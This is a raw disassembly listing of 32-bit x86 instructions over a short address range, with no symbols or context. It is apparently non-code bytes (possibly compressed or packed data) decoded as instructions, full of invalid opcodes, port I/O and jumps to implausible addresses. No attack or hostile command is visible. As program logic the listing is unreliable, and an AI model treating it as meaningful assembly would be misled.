  41c234:	push   0xe2f5227b
  41c239:	cli    
  41c23a:	dec    ebx
  41c23b:	mov    ebx,0x2e9a995f
  41c240:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c241:	jo     0x41c2c1
  41c243:	dec    esp
  41c244:	test   eax,0xf7aca7c2
  41c249:	outs   dx,DWORD PTR ds:[esi]
  41c24a:	idiv   DWORD PTR [esi]
  41c24c:	gs xor bl,bl
  41c24f:	inc    edx
  41c250:	add    BYTE PTR [eax-0x30],cl
  41c253:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c255:	and    esi,edx
  41c257:	mov    DWORD PTR [ebp-0x42554beb],edx
  41c25d:	xor    BYTE PTR [ebx-0x4e641436],dh
  41c263:	push   eax
  41c264:	sbb    cl,ah
  41c266:	mov    dl,0xc8
  41c268:	repz sbb DWORD PTR [ecx-0x35],esi
  41c26c:	push   ds
  41c26d:	daa    
  41c26e:	xor    edx,DWORD PTR [ecx+eiz*1]
  41c271:	or     eax,0x981ba85e
  41c276:	into   
  41c277:	addr16 aaa 
  41c279:	fstp   QWORD PTR [eax+0x6c]
  41c27c:	bound  esi,QWORD PTR [edx+0x7017f7c9]
  41c282:	jno    0x41c298
  41c284:	out    0x88,al
  41c286:	pusha  
  41c287:	dec    ebp
  41c288:	shl    BYTE PTR [eax-0x52606c15],0x69
  41c28f:	xor    ch,BYTE PTR [edi]
  41c291:	(bad)  
  41c292:	push   edx
  41c293:	inc    eax
  41c294:	data16 xchg bh,dh
  41c297:	cmp    ch,BYTE PTR [edx+0xf]
  41c29a:	mov    DWORD PTR [ebp+0x45],ecx
  41c29d:	mov    al,ds:0xb93f8cdb
  41c2a2:	lods   al,BYTE PTR ds:[esi]
  41c2a3:	pop    esi
  41c2a4:	sub    eax,0x890ebb54
  41c2a9:	and    esp,0xffffff84
  41c2ac:	mov    bh,0xeb
  41c2ae:	dec    edi
  41c2af:	push   esi
  41c2b0:	sbb    eax,0x454216b4
  41c2b5:	push   edi
  41c2b6:	dec    esp
  41c2b7:	xchg   ebp,eax
  41c2b8:	imul   edi,DWORD PTR [ecx-0x6e63c975],0x0
  41c2bf:	xchg   esp,eax
  41c2c0:	mov    edi,0xfde88895
  41c2c5:	pop    es
  41c2c6:	mov    bl,0xcf
  41c2c8:	pusha  
  41c2c9:	dec    ecx
  41c2ca:	xor    dh,BYTE PTR [edx-0x5d]
  41c2cd:	fisubr DWORD PTR ds:0x96d8325a
  41c2d3:	aam    0xbd
  41c2d5:	sbb    al,BYTE PTR [ebx]
  41c2d7:	dec    ebp
  41c2d8:	inc    esp
  41c2d9:	cld    
  41c2da:	dec    esp
  41c2db:	mov    BYTE PTR [ebp-0x34],ch
  41c2de:	and    ebx,DWORD PTR [esi+0x7c]
  41c2e1:	xlat   BYTE PTR ds:[ebx]
  41c2e2:	rcr    cl,cl
  41c2e4:	outs   dx,DWORD PTR ds:[esi]
  41c2e5:	push   esi
  41c2e6:	xchg   esi,eax
  41c2e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c2e8:	push   ebx
  41c2e9:	inc    eax
  41c2ea:	mov    al,0x54
  41c2ec:	ins    BYTE PTR es:[edi],dx
  41c2ed:	hlt    
  41c2ee:	imul   edi,edi,0xffffffb6
  41c2f1:	jl     0x41c2d1
  41c2f3:	outs   dx,DWORD PTR ds:[esi]
  41c2f4:	mov    dl,0xdd
  41c2f6:	jecxz  0x41c2f7
  41c2f8:	out    0x24,al
  41c2fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c2fb:	sti    
  41c2fc:	inc    ebp
  41c2fd:	bound  eax,QWORD PTR [eax]
  41c2ff:	and    edx,esp
  41c301:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c302:	mov    dl,0x49
  41c304:	in     al,dx
  41c305:	mov    edi,0xc852f16f
  41c30a:	stos   BYTE PTR es:[edi],al
  41c30b:	and    bl,BYTE PTR [ebp-0x4baf5bf]
  41c311:	call   0x19024e7e
  41c316:	jp     0x41c300
  41c318:	add    bl,0x27
  41c31b:	scas   al,BYTE PTR es:[edi]
  41c31c:	into   
  41c31d:	stc    
  41c31e:	and    BYTE PTR [eax-0x7f2626d9],bl
  41c324:	push   esi
  41c325:	imul   cl
  41c327:	inc    eax
  41c328:	add    edi,DWORD PTR [esi+esi*4]
  41c32b:	xor    esi,ebx
  41c32d:	(bad)  [edi-0xc4a088d]
  41c333:	and    al,BYTE PTR [esi+ebx*1-0x4b60e2c4]
  41c33a:	cmp    ebp,ecx
  41c33c:	fmulp  st(2),st
  41c33e:	call   0x4a68:0x54d2507f
  41c345:	xchg   edx,eax
  41c346:	jp     0x41c352
  41c348:	loopne 0x41c39c
  41c34a:	cmc    
  41c34b:	popa   
  41c34c:	push   ds
  41c34d:	xchg   ecx,eax
  41c34e:	scas   eax,DWORD PTR es:[edi]
  41c34f:	pop    ebx
  41c350:	mov    eax,0x5596cfa8
  41c355:	outs   dx,BYTE PTR ds:[esi]
  41c356:	fcomp  QWORD PTR [edx]
  41c358:	push   ss
  41c359:	pop    edi
  41c35a:	ret    
  41c35b:	iret   
  41c35c:	pop    ds
  41c35d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c35e:	adc    al,0x72
  41c360:	sub    eax,edx
  41c362:	jge    0x41c355
  41c364:	adc    esi,DWORD PTR [ebp+0x1c]
  41c367:	and    eax,0xdf25e1ba
  41c36c:	push   ebx
  41c36d:	(bad)  
  41c36e:	in     al,0xdf
  41c370:	xchg   esp,eax
  41c371:	add    ch,0xcf
  41c374:	aam    0x25
  41c376:	push   ebp
  41c377:	rcl    DWORD PTR [esi+0x55],1
  41c37a:	or     ebx,DWORD PTR [eax-0x1c]
  41c37d:	mov    eax,ds:0xff6c0986
  41c382:	bound  ecx,QWORD PTR [ebx-0x52]
  41c385:	sahf   
  41c386:	(bad)  
  41c387:	and    eax,0x235116a0
  41c38c:	call   0x8610f5d7
  41c391:	mov    ch,0x14
  41c393:	pop    esi
  41c394:	and    ecx,DWORD PTR [ebp-0x4d]
  41c397:	rcr    ebp,0x74
  41c39a:	add    al,0xa7
  41c39c:	xchg   edx,eax
  41c39d:	inc    ebp
  41c39e:	mov    ds:0xb218931,al
  41c3a3:	pop    es
  41c3a4:	inc    edx
  41c3a5:	cdq    
  41c3a6:	jmp    0x75671d68
  41c3ab:	push   cs
  41c3ac:	std    
  41c3ad:	xchg   ecx,eax
  41c3ae:	das    
  41c3af:	xor    esi,DWORD PTR [edi-0x4c]
  41c3b2:	cwde   
  41c3b3:	push   ebx
  41c3b4:	repnz mov al,0x53
  41c3b7:	mov    WORD PTR [ecx],ss
  41c3b9:	js     0x41c38d
  41c3bb:	add    eax,0x4d37c7d
  41c3c0:	sub    BYTE PTR [edi],dh
  41c3c2:	add    cl,BYTE PTR [edx-0x70ed343f]
  41c3c8:	mov    edi,0x46d214d6
  41c3cd:	bound  eax,QWORD PTR [ecx]
  41c3cf:	push   esi
  41c3d0:	das    
  41c3d1:	pop    ebp
  41c3d2:	mov    ebp,0x69d5cb3f
  41c3d7:	test   ebx,0xb789c446
  41c3dd:	lea    edi,ds:0xebfc701b
  41c3e3:	pop    edi
  41c3e4:	xchg   edx,eax
  41c3e5:	cmc    
  41c3e6:	inc    esp
  41c3e7:	lods   eax,DWORD PTR ds:[esi]
  41c3e8:	mov    ds:0xeeba752e,eax
  41c3ed:	xchg   ebp,eax
  41c3ee:	shl    DWORD PTR [ebx],1
  41c3f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c3f1:	pop    ss
  41c3f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c3f3:	jae    0x41c42f
  41c3f5:	mov    BYTE PTR [edi+0x12ceecb6],ah
  41c3fb:	push   ebp
  41c3fc:	lahf   
  41c3fd:	jecxz  0x41c3dd
  41c3ff:	rcl    BYTE PTR [esi+0xcfa9039],0x57
  41c406:	bound  ecx,QWORD PTR [eax]
  41c408:	pushf  
  41c409:	fisub  DWORD PTR [ebp+0x77d835f8]
  41c40f:	pop    eax
  41c410:	jo     0x41c3ee
  41c412:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c413:	mov    ecx,0x13ea8f95
  41c418:	mov    esp,0x902eb060
  41c41d:	push   edx
  41c41e:	es aad 0xca
  41c421:	and    eax,0x74ff43e9
  41c426:	div    DWORD PTR [esi+0x28]
  41c429:	mov    dh,0x8b
  41c42b:	push   esi
  41c42c:	ds cwde 
  41c42e:	add    eax,0x1bc12103
  41c433:	xor    BYTE PTR [ebx],bl
  41c435:	mov    al,0xfc
  41c437:	lea    ebp,[edi-0x2f2c120c]
  41c43d:	sbb    al,0xec
  41c43f:	mov    ebp,0x6be9b82d
  41c444:	mov    dh,0x17
  41c446:	ret    
  41c447:	mov    eax,0xe629c9ea
  41c44c:	jne    0x41c4bc
  41c44e:	test   eax,0x600623df
  41c453:	scas   eax,DWORD PTR es:[edi]
  41c454:	mov    dl,0xf9
  41c456:	inc    eax
  41c457:	scas   al,BYTE PTR es:[edi]
  41c458:	cwde   
  41c459:	mov    esi,DWORD PTR [esi]
  41c45b:	adc    BYTE PTR [ebx+esi*8+0x681f0d6f],0x5a
  41c463:	jo     0x41c444
  41c465:	push   0xffffffc2
  41c467:	call   0x77ad72cc
  41c46c:	or     ah,al
  41c46e:	sub    ch,BYTE PTR [ebx+0x60a310a5]
  41c474:	in     al,dx
  41c475:	mov    ah,0xb7
  41c477:	loope  0x41c488
  41c479:	outs   dx,DWORD PTR ds:[esi]
  41c47a:	cmp    dl,BYTE PTR [esi]
  41c47c:	and    DWORD PTR [esi-0xf3f21d0],edx
  41c482:	fld    QWORD PTR [ebx]
  41c484:	pop    es
  41c485:	aaa    
  41c486:	jmp    0x41c41e
  41c488:	pop    es
  41c489:	out    0x1e,al
  41c48b:	jne    0x41c414
  41c48d:	dec    ecx
  41c48e:	inc    edx
  41c48f:	and    eax,0x42a56cab
  41c494:	jmp    0x41c44c
  41c496:	hlt    
  41c497:	loope  0x41c444
  41c499:	push   ds
  41c49a:	and    ah,BYTE PTR [eax-0x75]
  41c49d:	lahf   
  41c49e:	mov    bl,0xd8
  41c4a0:	and    edi,DWORD PTR [eax+0xb]
  41c4a3:	push   edx
  41c4a4:	fimul  DWORD PTR [edx+0x2d25505e]
  41c4aa:	adc    al,0x6
  41c4ac:	xchg   ecx,eax
  41c4ad:	aas    
  41c4ae:	mov    al,0x92
  41c4b0:	or     dh,BYTE PTR [ebp+0x2c92b851]
  41c4b6:	cmp    eax,0x43f837bb
  41c4bb:	jg     0x41c536
  41c4bd:	pop    ebp
  41c4be:	jle    0x41c52e
  41c4c0:	int3   
  41c4c1:	(bad)  
  41c4c2:	mov    cl,0xa4
  41c4c4:	shl    DWORD PTR [esi],1
  41c4c6:	xchg   ebp,eax
  41c4c7:	mov    al,0xfa
  41c4c9:	or     cl,BYTE PTR [ecx]
  41c4cb:	cmp    dl,dl
  41c4cd:	imul   esp,DWORD PTR [edx],0x922e86c6
  41c4d3:	add    DWORD PTR [edx+0x2fdb3dbb],ebp
  41c4d9:	out    dx,eax
  41c4da:	(bad)  
  41c4db:	into   
  41c4dc:	cmp    esi,DWORD PTR ds:0xe19fef68
  41c4e2:	xchg   ebp,eax
  41c4e3:	(bad)  
  41c4e4:	xor    al,0xb3
  41c4e6:	aam    0xb4
  41c4e8:	sub    DWORD PTR [edx+0x6251eb4b],esp
  41c4ee:	push   edx
  41c4ef:	lea    edi,[ebx+eiz*8]
  41c4f2:	jmp    0x41c526
  41c4f4:	xor    eax,DWORD PTR [edx+0x2e]
  41c4f7:	sbb    eax,0xb3639941
  41c4fc:	fwait
  41c4fd:	aas    
  41c4fe:	cs dec ecx
  41c500:	mov    ah,0xb9
  41c502:	xchg   esi,eax
  41c503:	fdivp  st(2),st
  41c505:	lock jne 0x41c498
  41c508:	(bad)  
  41c509:	daa    
  41c50a:	and    ch,ch
  41c50c:	sbb    dh,BYTE PTR [ebp+0x6b]
  41c50f:	test   BYTE PTR [edi+0x34],bl
  41c512:	add    eax,0xc44ae8ac
  41c517:	pop    edi
  41c518:	jno    0x41c4ae
  41c51a:	scas   al,BYTE PTR es:[edi]
  41c51b:	lahf   
  41c51c:	inc    ebx
  41c51d:	call   0x506ddf83
  41c522:	cmp    bl,BYTE PTR [edi+0x40]
  41c525:	fcom   DWORD PTR [esi+0x3]
  41c528:	adc    BYTE PTR [esp+eiz*4-0x60],dh
  41c52c:	mov    al,ds:0x4c72ee3e
  41c531:	xchg   ebp,eax
  41c532:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c533:	cmp    ebp,esp
  41c535:	fidiv  DWORD PTR [eax+ecx*1-0x31dbb952]
  41c53c:	repz jle 0x41c573
  41c53f:	cmc    
  41c540:	scas   eax,DWORD PTR es:[edi]
  41c541:	mov    DWORD PTR [edi],ecx
  41c543:	leave  
  41c544:	test   al,0x28
  41c546:	jmp    0x41c588
  41c548:	mov    al,ds:0x36e66605
  41c54d:	mov    cl,0x4c
  41c54f:	mov    esi,0xd67a98a9
  41c554:	jle    0x41c518
  41c556:	aaa    
  41c557:	in     al,0xd1
  41c559:	popa   
  41c55a:	mov    dl,BYTE PTR [ecx]
  41c55c:	retf   
  41c55d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c55e:	and    BYTE PTR [ebx-0x71a8a160],dh
  41c564:	cmp    eax,0x6222470f
  41c569:	jmp    0x41c536
  41c56b:	leave  
  41c56c:	dec    edx
  41c56d:	test   dh,bh
  41c56f:	div    BYTE PTR [esi-0x67]
  41c572:	mov    al,ds:0x6924e625
  41c577:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c578:	imul   eax,DWORD PTR [ecx-0x2b],0xa58aa9e1
  41c57f:	nop
  41c580:	ins    BYTE PTR es:[edi],dx
  41c581:	inc    ecx
  41c582:	scas   eax,DWORD PTR es:[edi]
  41c583:	adc    esp,DWORD PTR [esi+0x36]
  41c586:	push   edi
  41c587:	adc    eax,DWORD PTR [esi+edx*8-0x58]
  41c58b:	mov    WORD PTR [ebx+edx*4+0x4d],?
  41c58f:	pop    ebp
  41c590:	popf   
  41c591:	retf   0xc0b
  41c594:	int3   
  41c595:	scas   eax,DWORD PTR es:[edi]
  41c596:	add    DWORD PTR [ebp+0x77],ebx
  41c599:	out    dx,eax
  41c59a:	icebp  
  41c59b:	mov    cs,WORD PTR [ebp+0x79]
  41c59e:	dec    esi
  41c59f:	mov    esp,0xe0326072
  41c5a4:	lds    edi,FWORD PTR [ebp+0x45]
  41c5a7:	mov    edi,0xa76f3b2f
  41c5ac:	and    ecx,DWORD PTR [edi]
  41c5ae:	dec    ebx
  41c5af:	mov    dl,0x88
  41c5b1:	push   ebp
  41c5b2:	mov    ah,0x2e
  41c5b4:	push   es
  41c5b5:	test   dh,al
  41c5b7:	sub    esp,edx
  41c5b9:	mov    eax,0xb5523608
  41c5be:	dec    ecx
  41c5bf:	mov    dh,0xf1
  41c5c1:	add    eax,0x63f1f2df
  41c5c6:	adc    eax,0xee543894
  41c5cb:	jg     0x41c641
  41c5cd:	fnstcw WORD PTR [esi-0x1f]
  41c5d0:	dec    esi
  41c5d1:	dec    ebx
  41c5d2:	outs   dx,BYTE PTR ds:[esi]
  41c5d3:	jo     0x41c56b
  41c5d5:	push   edi
  41c5d6:	(bad)  
  41c5d7:	repz dec esp
  41c5d9:	mov    ch,0xfe
  41c5db:	mov    ch,0xc4
  41c5dd:	push   0x2c29999b
  41c5e2:	mov    edx,0xe99c116d
  41c5e7:	or     DWORD PTR [edi-0x3ca35f0a],edi
  41c5ed:	pushf  
  41c5ee:	jno    0x41c5d0
  41c5f0:	or     DWORD PTR [edx],ecx
  41c5f2:	xor    ah,cl
  41c5f4:	add    al,0x47
  41c5f6:	and    al,0x98
  41c5f8:	add    DWORD PTR [eax],0x51ee6549
  41c5fe:	mov    ebp,0xdfe9516
  41c603:	mov    dl,0x46
  41c605:	sub    BYTE PTR [edx+eiz*1],0xd8
  41c609:	fsubr  DWORD PTR [edi]
  41c60b:	xor    eax,0x2cbad591
  41c610:	out    dx,al
  41c611:	pop    eax
  41c612:	clc    
  41c613:	mov    ah,0x77
  41c615:	pop    edx
  41c616:	out    0x27,al
  41c618:	dec    esi
  41c619:	paddb  mm3,QWORD PTR [ebx+0x5e669148]
  41c620:	adc    edx,DWORD PTR [ecx+0x18]
  41c623:	nop
  41c624:	dec    ecx
  41c625:	shl    eax,1
  41c627:	clc    
  41c628:	out    0xcb,al
  41c62a:	call   0x1d8a9416
  41c62f:	push   edx
  41c630:	pop    es
  41c631:	mov    esi,0xd668a12d
  41c636:	mov    ebx,0xc4beb428
  41c63b:	pushf  
  41c63c:	or     edi,DWORD PTR [edi-0x3b1fac51]
  41c642:	ficom  WORD PTR [esi-0x6d973ac8]
  41c648:	push   edx
  41c649:	add    DWORD PTR [edx+0x6d],ebp
  41c64c:	adc    al,0xa9
  41c64e:	test   eax,0xccb452ae
  41c653:	shr    ah,0xd6
  41c656:	jp     0x41c5f4
  41c658:	sub    al,0xb9
  41c65a:	mov    eax,ds:0x27833f0c
  41c65f:	dec    esi
  41c660:	data16 aad 0x5b
  41c663:	test   al,0xde
  41c665:	mov    bl,0xa3
  41c667:	ret    
  41c668:	stos   DWORD PTR es:[edi],eax
  41c669:	adc    bh,BYTE PTR [ebp+0x19a2b835]
  41c66f:	fidiv  DWORD PTR [eax+0x3ba25d8a]
  41c676:	test   al,0xf6
  41c678:	ins    BYTE PTR es:[edi],dx
  41c679:	out    0x15,al
  41c67b:	xor    ah,BYTE PTR [ebp+ebx*1-0x6d01519a]
  41c682:	les    ebp,FWORD PTR ds:0xdcb52aee
  41c688:	jle    0x41c6ef
  41c68a:	xchg   ecx,eax
  41c68b:	repnz cmp BYTE PTR ds:0x72c89208,ah
  41c692:	xchg   ecx,eax
  41c693:	push   esp
  41c694:	xchg   ecx,eax
  41c695:	outs   dx,DWORD PTR ds:[esi]
  41c696:	pop    esp
  41c697:	and    al,0x4e
  41c699:	fmul   DWORD PTR [edi+eax*2]
  41c69c:	addr16 out dx,al
  41c69e:	and    BYTE PTR [ecx-0x12],dh
  41c6a1:	bound  esp,QWORD PTR [edi+0x71]
  41c6a4:	add    esi,DWORD PTR [ecx]
  41c6a6:	shr    DWORD PTR [ecx-0x214020eb],0xf3
  41c6ad:	dec    esi
  41c6ae:	mov    cs,WORD PTR [edx-0x4a6d7264]
  41c6b4:	hlt    
  41c6b5:	lea    edi,[esi-0x76c1d1e4]
  41c6bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c6bc:	mov    ch,BYTE PTR [eax+0x444c4030]
  41c6c2:	dec    edi
  41c6c3:	mov    ebp,0x2742fcd8
  41c6c8:	imul   eax,DWORD PTR [eax-0x29],0xffffff8e
  41c6cc:	push   esi
  41c6cd:	cmp    cl,BYTE PTR [ebx]
  41c6cf:	jmp    0x41c708
  41c6d1:	lods   al,BYTE PTR ds:[esi]
  41c6d2:	mov    dh,0x7
  41c6d4:	out    0x98,al
  41c6d6:	out    dx,eax
  41c6d7:	xchg   DWORD PTR es:0x6ab5832,ebp
  41c6de:	and    DWORD PTR [edx],0x39
  41c6e1:	pop    eax
  41c6e2:	push   ss
  41c6e3:	stc    
  41c6e4:	adc    DWORD PTR [edi],ebp
  41c6e6:	imul   esi,DWORD PTR [ebx+0x42],0xffffff85
  41c6ea:	and    edx,esi
  41c6ec:	mov    ch,al
  41c6ee:	ins    BYTE PTR es:[edi],dx
  41c6ef:	pop    es
  41c6f0:	xor    BYTE PTR [esi+eax*2-0x5da3f4d6],0xb4
  41c6f8:	jp     0x41c693
  41c6fa:	jp     0x41c776
  41c6fc:	hlt    
  41c6fd:	lahf   
  41c6fe:	ja     0x41c6d9
  41c700:	inc    esi
  41c701:	and    DWORD PTR [ecx-0x24],eax
  41c704:	inc    edi
  41c705:	mov    eax,ds:0x5f20be99
  41c70a:	mov    WORD PTR [eax-0x52],fs
  41c70d:	mov    dl,BYTE PTR [eax+0x26]
  41c710:	sbb    al,0xb5
  41c712:	xor    ah,BYTE PTR [edx+0x618ec506]
  41c718:	int    0x7f
  41c71a:	pop    es
  41c71b:	retf   
  41c71c:	dec    esi
  41c71d:	ret    0x535a
  41c720:	in     eax,dx
  41c721:	and    eax,0x2bd0926a
  41c726:	push   0x5ab7d024
  41c72b:	data16 test al,0x6
  41c72e:	int3   
  41c72f:	xchg   ebx,eax
  41c730:	repz mov bh,BYTE PTR [ebp+0x1d92ffb3]
  41c737:	xchg   dx,ax
  41c739:	rcl    al,0x1
  41c73c:	call   0x4d4d81e3
  41c741:	mov    eax,0xc55ca35a
  41c746:	dec    ebx
  41c747:	aam    0x15
  41c749:	mov    ch,0xf7
  41c74b:	mov    bl,0x1e
  41c74d:	jp     0x41c749
  41c74f:	pop    esp
  41c750:	xlat   BYTE PTR ds:[ebx]
  41c751:	push   ebx
  41c752:	cmp    DWORD PTR [esi+0x10],0x5db8c5aa
  41c759:	mov    al,ds:0x2f727c78
  41c75e:	mov    ebx,0xf9fd207b
  41c763:	mov    al,0x4d
  41c765:	jg     0x41c78c
  41c767:	adc    ah,BYTE PTR ds:0x2f93a388
  41c76d:	pop    ebp
  41c76e:	jl     0x41c78c
  41c770:	jle    0x41c6f8
  41c772:	iret   
  41c773:	out    dx,al
  41c774:	sbb    al,0x8d
  41c776:	push   ebp
  41c777:	xchg   edx,eax
  41c778:	ins    BYTE PTR es:[edi],dx
  41c779:	push   ecx
  41c77a:	and    al,bl
  41c77c:	in     eax,0x73
  41c77e:	int    0x31
  41c780:	mov    eax,ds:0x66d5e688
  41c785:	push   edx
  41c786:	mov    cl,0xd3
  41c788:	cmp    edx,DWORD PTR [ecx-0x5afa8b3c]
  41c78e:	inc    ebx
  41c78f:	std    
  41c790:	fild   QWORD PTR [edi+0x410f4ec1]
  41c796:	cwde   
  41c797:	add    ecx,ebp
  41c799:	pop    ecx
  41c79a:	fbld   TBYTE PTR [ebp+0x72]
  41c79d:	loopne 0x41c743
  41c79f:	fs push es
  41c7a1:	and    eax,0x27d963e7
  41c7a6:	sbb    ecx,edx
  41c7a8:	push   ss
  41c7a9:	mov    al,0xf0
  41c7ab:	adc    dl,bh
  41c7ad:	push   edx
  41c7ae:	out    dx,al
  41c7af:	sar    DWORD PTR [eax+eax*4],0x50
  41c7b3:	out    0xe7,eax
  41c7b5:	dec    edi
  41c7b6:	or     al,0x43
  41c7b8:	push   edi
  41c7b9:	retf   0xf67b
  41c7bc:	loopne 0x41c78e
  41c7be:	icebp  
  41c7bf:	je     0x41c79f
  41c7c1:	mov    ch,0xe0
  41c7c3:	out    dx,al
  41c7c4:	popf   
  41c7c5:	sbb    al,0x32
  41c7c7:	mov    esi,0x131553bd
  41c7cc:	pop    edi
  41c7cd:	fcomi  st,st(3)
  41c7cf:	ja     0x41c79c
  41c7d1:	mov    al,ds:0xcbbaee69
  41c7d6:	in     eax,0x94
  41c7d8:	iret   
  41c7d9:	jns    0x41c808
  41c7db:	xor    al,0xfa
  41c7dd:	jmp    0x41c7d9
  41c7df:	sub    DWORD PTR [edx-0x789f488b],0xf3caa4d8
  41c7e9:	push   cs
  41c7ea:	jmp    0x41c793
  41c7ec:	shr    BYTE PTR [ebp+0x18804385],0x5
  41c7f3:	test   al,0x37
  41c7f5:	dec    bx
  41c7f7:	add    ebp,edi
  41c7f9:	mov    ds:0xd578718b,eax
  41c7fe:	add    BYTE PTR [ebx+0x5a],al
  41c801:	push   ds
  41c802:	out    0xca,al
  41c804:	mov    ss,ebp
  41c806:	dec    ecx
  41c807:	mov    dh,0x68
  41c809:	shl    DWORD PTR [edi+ebp*8+0x0],0x9c
  41c80e:	push   edx
  41c80f:	or     eax,DWORD PTR [ebp+0x1a]
  41c812:	push   edx
  41c813:	push   esi
  41c814:	test   dl,cl
  41c816:	loope  0x41c892
  41c818:	test   al,0x6b
  41c81a:	and    eax,0x4e3fcb16
  41c81f:	aas    
  41c820:	sbb    cl,dl
  41c822:	pusha  
  41c823:	scas   eax,DWORD PTR es:[edi]
  41c824:	scas   al,BYTE PTR es:[edi]
  41c825:	sti    
  41c826:	idiv   DWORD PTR [ebx+eiz*2-0x7a]
  41c82a:	jns    0x41c81f
  41c82c:	sub    al,0xac
  41c82e:	bound  ebx,QWORD PTR [esi]
  41c830:	mov    ebp,0xa5a6c343
  41c835:	in     eax,dx
  41c836:	xchg   ebp,eax
  41c837:	adc    ch,BYTE PTR [eax]
  41c839:	mov    edx,0x65040b31
  41c83e:	xchg   edi,eax
  41c83f:	test   BYTE PTR [edi-0xf],dl
  41c842:	jl     0x41c821
  41c844:	sub    eax,0x8017e879
  41c849:	mov    esi,0x9c6fa5cf
  41c84e:	out    0xee,eax
  41c850:	scas   eax,DWORD PTR es:[edi]
  41c851:	adc    dh,BYTE PTR [esi]
  41c853:	cmc    
  41c854:	xor    al,0x1f
  41c856:	pop    edx
  41c857:	pop    es
  41c858:	jg     0x41c846
  41c85a:	dec    edx
  41c85b:	dec    edx
  41c85c:	je     0x41c807
  41c85e:	mov    fs,WORD PTR [ebx]
  41c860:	std    
  41c861:	sub    ebx,ebx
  41c863:	add    ebp,DWORD PTR [edx]
  41c865:	loopne 0x41c830
  41c867:	pop    esp
  41c868:	sbb    eax,0x63cea02
  41c86d:	add    DWORD PTR [edi],edx
  41c86f:	sbb    bl,dl
  41c871:	jns    0x41c880
  41c873:	aad    0xc6
  41c875:	repnz sbb ebx,eax
  41c878:	cmp    DWORD PTR [ebp+0x60],0x55
  41c87c:	pop    ds
  41c87d:	test   DWORD PTR [ecx-0x6c],0x18694593
  41c884:	ror    DWORD PTR [ecx],0xa
  41c887:	fnstcw WORD PTR [ebx-0x35]
  41c88a:	xchg   ecx,eax
  41c88b:	pop    ss
  41c88c:	xchg   dh,cl
  41c88e:	sub    dh,BYTE PTR ds:0x7adcbf7d
  41c894:	out    dx,al
  41c895:	sub    al,0xc5
  41c897:	or     eax,0x20a47cf6
  41c89c:	jne    0x41c82f
  41c89e:	push   esi
  41c89f:	repnz enter 0x8e09,0xeb
  41c8a4:	sbb    edi,DWORD PTR ds:0xb5e253c1
  41c8aa:	aam    0x8d
  41c8ac:	mov    cl,0x88
  41c8ae:	dec    eax
  41c8af:	stc    
  41c8b0:	sub    DWORD PTR [esi-0x6e],ecx
  41c8b3:	les    esp,FWORD PTR [ecx+0x8]
  41c8b6:	inc    edi
  41c8b7:	xchg   ecx,eax
  41c8b8:	mov    WORD PTR [ebp-0x4b8a7e69],ds
  41c8be:	mov    edi,0xbe7880d8
  41c8c3:	arpl   WORD PTR [edx],dx
  41c8c5:	mov    esp,0x75730ffb
  41c8ca:	dec    esi
  41c8cb:	fidivr DWORD PTR [eax]
  41c8cd:	mov    cl,0xd0
  41c8cf:	mov    bl,0xea
  41c8d1:	(bad)  
  41c8d2:	xchg   ebx,eax
  41c8d3:	idiv   BYTE PTR [eax+edx*8-0xf7f029]
  41c8da:	test   BYTE PTR [esp+ecx*8+0x38c15c91],dh
  41c8e1:	cdq    
  41c8e2:	aas    
  41c8e3:	ja     0x41c873
  41c8e5:	outs   dx,DWORD PTR ds:[esi]
  41c8e6:	mov    ebx,0x70f0bf6f
  41c8eb:	pop    ebx
  41c8ec:	jge    0x41c938
  41c8ee:	xor    eax,0x44568b50
  41c8f3:	in     al,0x93
  41c8f5:	cmp    al,0x58
  41c8f7:	xor    eax,0x322fc6ef
  41c8fc:	out    0x66,eax
  41c8fe:	in     eax,0x67
  41c900:	xor    BYTE PTR [esp+eiz*4-0x13c6df4a],dl
  41c907:	adc    eax,0xf224bd79
  41c90c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c90d:	mov    eax,ds:0xcf341d8a
  41c912:	sub    BYTE PTR [edi+0x4],0x40
  41c916:	rep outs dx,DWORD PTR ds:[esi]
  41c918:	arpl   WORD PTR [ebx],sp
  41c91a:	fwait
  41c91b:	inc    edi
  41c91c:	rol    BYTE PTR [ecx+0x72],0x66
  41c920:	daa    
  41c921:	jb     0x41c920
  41c923:	or     edi,edx
  41c925:	inc    edi
  41c926:	sub    bl,BYTE PTR [edi+ebp*1]
  41c929:	inc    edx
  41c92a:	into   
  41c92b:	xchg   edx,eax
  41c92c:	mov    al,ds:0x8bd765ef
  41c931:	mov    WORD PTR [eax],gs
  41c933:	iret   
  41c934:	xchg   ebx,eax
  41c935:	gs shl edi,1
  41c938:	shl    DWORD PTR [esi+0xd59d051],cl
  41c93e:	lds    ebx,FWORD PTR [esp+eiz*4+0x6d]
  41c942:	in     al,0x39
  41c944:	les    eax,FWORD PTR ds:0xd55c89eb
  41c94a:	pop    edx
  41c94b:	out    0x45,al
  41c94d:	pop    esp
  41c94e:	stc    
  41c94f:	jl     0x3a2e24e0
  41c955:	jo     0x41c9a9
  41c957:	sbb    al,ch
  41c959:	sub    BYTE PTR [edx-0x1],bl
  41c95c:	std    
  41c95d:	leave  
  41c95e:	in     eax,dx
  41c95f:	add    ebp,edx
  41c961:	inc    esi
  41c962:	fwait
  41c963:	(bad)  
  41c964:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c965:	mov    al,ds:0xb7bde1be
  41c96a:	push   edx
  41c96b:	push   ss
  41c96c:	adc    bl,BYTE PTR [eax-0x5]
  41c96f:	dec    esp
  41c970:	mov    esp,0x77213b9
  41c975:	rcr    BYTE PTR [ebx+0x59],0xb6
  41c979:	clc    
  41c97a:	loope  0x41c927
  41c97c:	cwde   
  41c97d:	push   ss
  41c97e:	(bad)  
  41c97f:	dec    esp
  41c980:	dec    edi
